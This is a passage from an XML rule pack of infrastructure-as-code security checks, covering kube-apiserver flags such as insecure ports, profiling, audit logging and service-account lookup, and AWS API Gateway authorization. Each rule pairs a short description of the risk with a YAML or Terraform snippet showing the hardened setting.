      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---insecure-bind-address-argument-is-set"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-insecure-bind-address-argument-is-set"></div>The --insecure-bind-address argument is set</div><a aria-label="Skip link to The --insecure-bind-address argument is set" class="heading-anchor-icon fa fa-anchor" href="#the---insecure-bind-address-argument-is-set"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Do not bind the insecure API service.<br/>
If you bind the apiserver to an insecure address, basically anyone who could connect to it over the insecure port, would have unauthenticated and unencrypted access to your master node. The apiserver doesn't do any authentication checking for insecure binds and traffic to the Insecure API port is not encrpyted, allowing attackers to potentially read sensitive data in transit.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --bind-address=192.168.1.1
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-insecure-bind-address-argument-is-not-set' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-insecure-bind-address-argument-is-not-set</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-insecure-bind-address-argument-is-not-set' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_88</key>
    <name>Ensure the --insecure-port argument is set to 0</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---insecure-port-argument-is-not-set-to-0"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-insecure-port-argument-is-not-set-to-0"></div>The --insecure-port argument is not set to 0  </div><a aria-label="Skip link to The --insecure-port argument is not set to 0  " class="heading-anchor-icon fa fa-anchor" href="#the---insecure-port-argument-is-not-set-to-0"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Do not bind to insecure port. Setting up the apiserver to serve on an insecure port would allow unauthenticated and unencrypted access to your master node. This would allow attackers who could access this port, to easily take control of the cluster.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --insecure-port=0
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-insecure-port-argument-is-set-to-0' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-insecure-port-argument-is-set-to-0</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-insecure-port-argument-is-set-to-0' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_89</key>
    <name>Ensure the --secure-port argument is not set to 0</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---secure-port-argument-is-set-to-0"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-secure-port-argument-is-set-to-0"></div>The --secure-port argument is set to 0</div><a aria-label="Skip link to The --secure-port argument is set to 0" class="heading-anchor-icon fa fa-anchor" href="#the---secure-port-argument-is-set-to-0"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Do not disable the secure port. The secure port is used to serve https with authentication and authorization. If you disable it, no https traffic is served and all traffic is served unencrypted.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --secure-port=80
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-secure-port-argument-is-not-set-to-0' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-secure-port-argument-is-not-set-to-0</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-secure-port-argument-is-not-set-to-0' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_59</key>
    <name>Ensure API gateway methods are not publicly accessible</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="api-gateway-methods-are-publicly-accessible"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-api-gateway-methods-are-publicly-accessible"></div>API gateway methods are publicly accessible</div><a aria-label="Skip link to API gateway methods are publicly accessible" class="heading-anchor-icon fa fa-anchor" href="#api-gateway-methods-are-publicly-accessible"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>AWS API gateway methods are by default publicly accessible. All of the methods configured as part of the API should be protected by an Authorizer or an API key. Unprotected API's can lead to data leaks and security breaches.</p>
<p>We recommend you configure a custom authorizer OR an API key for every method in the API Gateway.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource: </strong> AWS::ApiGateway::Method</li>
<li><strong>Argument:</strong> Properties.HttpMethod / Properties.AuthorizationType / Properties.ApiKeyRequired</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  ProtectedExample1:
    Type: 'AWS::ApiGateway::Method'
    Properties:
      ...
+     HttpMethod: OPTIONS
      AuthorizationType: NONE
            ...
      
    ProtectedExample2:
    Type: 'AWS::ApiGateway::Method'
    Properties:
      ...
      HttpMethod: GET
      AuthorizationType: NONE
+     ApiKeyRequired: true
            ...

   ProtectedExample3:
    Type: 'AWS::ApiGateway::Method'
    Properties:
      ...
      HttpMethod: GET
+     AuthorizationType: AWS_IAM # or other valid authorization types
            ...
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h1>
<ul>
<li><strong>Resource: </strong> aws_api_gateway_method</li>
<li><strong>Argument:</strong> http_method, authorisation, api_key_required </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_api_gateway_method.pass.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_api_gateway_method.pass.tf">resource "aws_api_gateway_method" "pass" {
  rest_api_id = aws_api_gateway_rest_api.MyDemoAPI.id
  resource_id = aws_api_gateway_resource.MyDemoResource.id
 + http_method = "OPTIONS"
 + authorization    = "NONE"
 + api_key_required = true
  tags             = { test = "Fail" }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/public_6-api-gateway-authorizer-set' target='_blank'> https://docs.bridgecrew.io/docs/public_6-api-gateway-authorizer-set</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/public_6-api-gateway-authorizer-set' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_90</key>
    <name>Ensure the --profiling argument is set to False</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---profiling-argument-is-not-set-to-false"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-profiling-argument-is-not-set-to-false"></div>The --profiling argument is not set to False</div><a aria-label="Skip link to The --profiling argument is not set to False" class="heading-anchor-icon fa fa-anchor" href="#the---profiling-argument-is-not-set-to-false"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Disable profiling, if not needed.Profiling allows for the identification of specific performance bottlenecks. It generates a significant amount of program data that could potentially be exploited to uncover system and program details. If you are not experiencing any bottlenecks and do not need the profiler for troubleshooting purposes, it is recommended to turn it off to reduce the potential attack surface.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --profiling=false
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-profiling-argument-is-set-to-false-2' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-profiling-argument-is-set-to-false-2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-profiling-argument-is-set-to-false-2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_91</key>
    <name>Ensure the --audit-log-path argument is set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---audit-log-path-argument-is-not-set"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-audit-log-path-argument-is-not-set"></div>The --audit-log-path argument is not set</div><a aria-label="Skip link to The --audit-log-path argument is not set" class="heading-anchor-icon fa fa-anchor" href="#the---audit-log-path-argument-is-not-set"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enable auditing on the Kubernetes API Server and set the desired audit log path.<br/>
Auditing the Kubernetes API Server provides a security-relevant chronological set of records documenting the sequence of activities that have affected system by individual users, administrators or other components of the system. Even though currently, Kubernetes provides only basic audit capabilities, it should be enabled. You can enable it by setting an appropriate audit log path.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
 +  - kube-apiserver
 +  - --audit-log-path=/path/to/log
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-audit-log-path-argument-is-set' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-audit-log-path-argument-is-set</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-audit-log-path-argument-is-set' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_92</key>
    <name>Ensure the --audit-log-maxage argument is set to 30 or as appropriate</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---audit-log-maxage-argument-is-not-set-appropriately"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-audit-log-maxage-argument-is-not-set-appropriately"></div>The --audit-log-maxage argument is not set appropriately</div><a aria-label="Skip link to The --audit-log-maxage argument is not set appropriately" class="heading-anchor-icon fa fa-anchor" href="#the---audit-log-maxage-argument-is-not-set-appropriately"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Retain the logs for at least 30 days or as appropriate. Retaining logs for at least 30 days ensures that you can go back in time and investigate or correlate any events. Set your audit log retention period to 30 days or as per your business requirements.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+    - kube-apiserver
+    - --audit-log-maxage=40
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-audit-log-maxage-argument-is-set-to-30-or-as-appropriate' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-audit-log-maxage-argument-is-set-to-30-or-as-appropriate</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-audit-log-maxage-argument-is-set-to-30-or-as-appropriate' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_93</key>
    <name>Ensure the --audit-log-maxbackup argument is set to 10 or as appropriate</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---audit-log-maxbackup-argument-is-not-set-appropriately"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-audit-log-maxbackup-argument-is-not-set-appropriately"></div>The --audit-log-maxbackup argument is not set appropriately</div><a aria-label="Skip link to The --audit-log-maxbackup argument is not set appropriately" class="heading-anchor-icon fa fa-anchor" href="#the---audit-log-maxbackup-argument-is-not-set-appropriately"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Retain 10 or an appropriate number of old log files. Kubernetes automatically rotates the log files. Retaining old log files ensures that you would have sufficient log data available for carrying out any investigation or correlation. For example, if you have set file size of 100 MB and the number of old log files to keep as 10, you would approximate have 1 GB of log data that you could potentially use for your analysis.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --audit-log-maxbackup=15
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-audit-log-maxbackup-argument-is-set-to-10-or-as-appropriate' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-audit-log-maxbackup-argument-is-set-to-10-or-as-appropriate</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-audit-log-maxbackup-argument-is-set-to-10-or-as-appropriate' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_94</key>
    <name>Ensure the --audit-log-maxsize argument is set to 100 or as appropriate</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---audit-log-maxsize-argument-is-not-set-appropriately"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-audit-log-maxsize-argument-is-not-set-appropriately"></div>The --audit-log-maxsize argument is not set appropriately</div><a aria-label="Skip link to The --audit-log-maxsize argument is not set appropriately" class="heading-anchor-icon fa fa-anchor" href="#the---audit-log-maxsize-argument-is-not-set-appropriately"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Rotate log files on reaching 100 MB or as appropriate. Kubernetes automatically rotates the log files. Retaining old log files ensures that you would have sufficient log data available for carrying out any investigation or correlation. If you have set file size of 100 MB and the number of old log files to keep as 10, you would approximate have 1 GB of log data that you could potentially use for your analysis.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --audit-log-maxsize=150
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-audit-log-maxsize-argument-is-set-to-100-or-as-appropriate' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-audit-log-maxsize-argument-is-set-to-100-or-as-appropriate</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-audit-log-maxsize-argument-is-set-to-100-or-as-appropriate' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_96</key>
    <name>Ensure the --service-account-lookup argument is set to True</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---service-account-lookup-argument-is-not-set-to-true"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-service-account-lookup-argument-is-not-set-to-true"></div>The --service-account-lookup argument is not set to True  </div><a aria-label="Skip link to The --service-account-lookup argument is not set to True  " class="heading-anchor-icon fa fa-anchor" href="#the---service-account-lookup-argument-is-not-set-to-true"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Validate service account before validating token.<br/>
If <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">--service-account-lookup</code> is not enabled, the apiserver only verifies that the authentication token is valid, and does not validate that the service account token mentioned in the request is actually present in etcd. This allows using a service account token even after the corresponding service account is deleted. This is an example of time of check to time of use security issue.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --service-account-lookup=true
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
   ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-service-account-lookup-argument-is-set-to-true' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-service-account-lookup-argument-is-set-to-true</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-service-account-lookup-argument-is-set-to-true' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
